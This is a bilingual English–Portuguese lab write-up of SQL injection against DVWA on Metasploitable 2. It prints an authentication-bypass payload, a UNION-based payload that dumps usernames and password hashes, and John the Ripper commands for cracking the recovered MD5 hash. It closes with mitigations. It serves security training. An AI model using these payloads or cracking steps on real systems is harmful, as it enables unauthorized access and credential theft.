
# 🔓 SQL Injection - DVWA (Metasploitable)

## 🎯 Objective
Exploit a SQL Injection vulnerability in DVWA to extract user credentials and gain unauthorized access.

---

## 🖥️ Target Information
- Application: DVWA (Damn Vulnerable Web Application)
- Environment: Metasploitable 2
- Port: 80 (HTTP)
- Vulnerability: SQL Injection
- Security Level: Low

---

## 🔍 Enumeration

The target machine was accessed via a web browser:

```
http://<TARGET_IP>/dvwa
```

While inspecting the page source, a hint was found:

```html
<p>username is 'admin' with password 'password'</p>
```

This indicates weak credential exposure in the application.

---

## 🔎 Vulnerability Analysis

The application does not sanitize user input properly, making it vulnerable to SQL Injection.

The backend query is likely structured as:

```sql
SELECT * FROM users WHERE id = '<input>';
```

This allows manipulation of the query logic.

---

## 💥 Exploitation

### 🔹 Authentication Bypass

The following payload was used:

```sql
1' OR '1'='1' -- 
```

This forces the query to always return true, allowing bypass of authentication.

---

### 🔹 Data Extraction (UNION-based SQLi)

A more advanced payload was used:

```sql
1' UNION SELECT user, password FROM users -- 
```

This allowed extraction of:
- usernames
- password hashes

---

## 🧪 Post-Exploitation

A password hash was obtained:

```
5f4dcc3b5aa765d61d8327deb882cf99
```

The hash was saved to a file:

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
```

Then cracked using John the Ripper:

```bash
john --format=raw-md5 hash.txt
john --show hash.txt
```

The password was successfully recovered.

---

## 🔐 Impact

- Authentication bypass
- Exposure of user credentials
- Password cracking via weak hashing (MD5)
- Full access to application accounts

---

## 🛡️ Mitigation

- Use prepared statements (parameterized queries)
- Sanitize all user input
- Avoid exposing sensitive information in HTML
- Use strong hashing algorithms (e.g., bcrypt)
- Implement proper authentication controls

---

## 🧠 Lessons Learned

- SQL Injection can bypass authentication with simple payloads
- UNION-based SQLi allows data extraction from databases
- Weak hashing algorithms like MD5 are easily cracked
- Importance of inspecting source code for hidden information

---

## 📚 References

- OWASP SQL Injection
- DVWA Documentation



---

## 🇧🇷 Versão em Português

# 🔓 SQL Injection - DVWA (Metasploitable)

## 🎯 Objetivo
Explorar uma vulnerabilidade de SQL Injection no DVWA para extrair credenciais de usuários e obter acesso não autorizado.

---

## 🖥️ Informações do Alvo
- Aplicação: DVWA (Damn Vulnerable Web Application)
- Ambiente: Metasploitable 2
- Porta: 80 (HTTP)
- Vulnerabilidade: SQL Injection
- Nível de Segurança: Low

---

## 🔍 Enumeração

A aplicação foi acessada via navegador:

```
http://<IP_DO_ALVO>/dvwa
```

Ao inspecionar o código-fonte da página, foi encontrado um *hint*:

```html
<p>username is 'admin' with password 'password'</p>
```

Isso indica exposição de credenciais no código da aplicação.

---

## 🔎 Análise da Vulnerabilidade

A aplicação não sanitiza corretamente a entrada do usuário antes de utilizá-la em consultas SQL.

Exemplo de consulta vulnerável:

```sql
SELECT * FROM users WHERE id = '<input>';
```

Isso permite manipular a lógica da consulta.

---

## 💥 Exploração

### 🔹 Bypass de Autenticação

Payload utilizado:

```sql
1' OR '1'='1' -- 
```

Esse payload força a condição a ser sempre verdadeira, permitindo contornar a autenticação.

---

### 🔹 Extração de Dados (SQL Injection com UNION)

Payload utilizado:

```sql
1' UNION SELECT user, password FROM users -- 
```

Isso permitiu extrair:
- usuários
- hashes de senha

---

## 🧪 Pós-exploração

Um hash foi obtido:

```
5f4dcc3b5aa765d61d8327deb882cf99
```

O hash foi salvo em um arquivo:

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
```

E quebrado utilizando o John the Ripper:

```bash
john --format=raw-md5 hash.txt
john --show hash.txt
```

---

## 🔐 Impacto

- Bypass de autenticação
- Exposição de dados sensíveis
- Quebra de senha devido a hash fraco (MD5)
- Acesso completo às contas

---

## 🛡️ Mitigação

- Utilizar prepared statements
- Validar e sanitizar entradas
- Não expor informações sensíveis no HTML
- Utilizar algoritmos de hash seguros (bcrypt)

---

## 🧠 Lições Aprendidas

- SQL Injection pode ser explorado com payloads simples
- UNION permite extração de dados do banco
- MD5 é inseguro e facilmente quebrado
- Importância da análise do código-fonte

---

## 📚 Referências

- OWASP SQL Injection
- Documentação do DVWA
